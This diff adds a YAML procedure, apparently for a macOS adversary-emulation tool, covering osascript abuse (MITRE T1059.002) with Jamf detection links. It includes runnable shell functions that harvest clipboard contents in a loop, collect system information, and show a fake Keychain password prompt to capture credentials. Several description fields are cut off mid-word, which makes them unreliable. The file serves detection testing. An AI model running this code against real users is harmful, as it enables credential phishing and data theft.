@@ -1,0 +1,112 @@
+procedure_name: osascript
+tactic: Execution
+ttp_id: T1059.002
+guid: d77e7fe0-bb48-4dec-8b95-5653951b3b43
+intent: Execute AppleScripts and other OSA language scripts and commands. Sourced
+  from LOOBins; confirm MITRE mapping for each enabled option.
+author: Cedric Owens (@cedowens)
+created: '2023-04-19'
+updated: '2026-05-03'
+version: 1.0.4
+platform:
+- darwin
+detection:
+- ioc: 'Jamf Protect: Detect activity that is related to osascript gathering clipboard
+    content'
+  analysis: https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_clipboard
+- ioc: 'Jamf Protect: Detect activity that is related to osascript pulling system
+    information'
+  analysis: https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_system_information
+- ioc: 'Jamf Protect: Detect activity that is related to generating dialogs using
+    osascript and asking for specific user.arg'
+  analysis: https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_dialog_activity
+resources:
+- link: https://www.loobins.io/
+  description: "LOOBins \u2014 Living Off The Orchard macOS binaries"
+- link: https://attack.mitre.org/techniques/T1059/002/
+  description: "MITRE ATT&CK \u2014 T1059.002"
+- link: ''
+  description: ''
+- link: https://medium.com/red-teaming-with-a-blue-team-mentality/using-macos-internals-for-post-exploitation-b5faaa11e121
+  description: Using macOS Internals for Post Exploitation
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --use-the-osascript-binary-to-gather-sensitive-clipboard-data
+    description: A bash loop can gather clipboard contents over a defined time period.
+      The following command calls /u
+    execute_function:
+    - execute_use_osascript_binary_gather_sensitive_clipboard_data
+  - option: --use-the-osascript-binary-to-gather-system-information
+    description: osascript can be used to gather the operating system version, current
+      username, user ID, computer na
+    execute_function:
+    - execute_use_osascript_binary_gather_system_information
+  - option: --use-the-osascript-binary-to-prompt-the-user-for-credentials
+    description: osascript can be used to generate a dialogue box and request the
+      user to enter the keychain password
+    execute_function:
+    - execute_use_osascript_binary_prompt_user_credentials
+  - option: --use-the-osascript-binary-to-execute-a-jxa-javascript-for-automation-fi
+    description: JXA is often used by red teams (and potentially attackers) as a macOS
+      payload, as JXA is native to m
+    execute_function:
+    - execute_use_osascript_binary_execute_jxa_javascript_automation_file
+  global_variable:
+  - name: CMD_OSASCRIPT
+    type: string
+    default_value: /usr/bin/osascript
+  functions:
+  - name: execute_use_osascript_binary_gather_sensitive_clipboard_data
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_use_osascript_binary_gather_sensitive_clipboard_data() {\n    local\
+      \ result\n    result=$(while true; do echo $(osascript -e 'return (the clipboard)')\
+      \ >> clipdata.txt; sleep 10; done 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"\
+      $result\"\n    return 0\n}"
+  - name: execute_use_osascript_binary_gather_system_information
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_use_osascript_binary_gather_system_information() {\n    local result\n\
+      \    result=$(osascript -e 'return (system info)' 2>&1)\n    $CMD_PRINTF \"\
+      RESULT|%s\\n\" \"$result\"\n    return 0\n}"
+  - name: execute_use_osascript_binary_prompt_user_credentials
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_use_osascript_binary_prompt_user_credentials() {\n    local result\n\
+      \    result=$(osascript -e 'set popup to display dialog \"Keychain Access wants\
+      \ to use the login keychain\" & return & return & \"Please enter the keychain\
+      \ password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\"\
+      \ with title \"Authentication Needed\" with hidden answer' 2>&1)\n    $CMD_PRINTF\
+      \ \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
+  - name: execute_use_osascript_binary_execute_jxa_javascript_automation_file
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_use_osascript_binary_execute_jxa_javascript_automation_file() {\n\
+      \    local result\n    result=$(echo \"ObjC.import('Cocoa');\\nObjC.import('stdlib');\\\
+      nvar currentApp = Application.currentApplication();\\ncurrentApp.includeStandardAdditions\
+      \ = true;\\ncurrentApp.doShellScript('open -a Calculator.app');\" > calc.js\
+      \ && osascript -l JavaScript calc.js 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\"\
+      \ \"$result\"\n    return 0\n}"
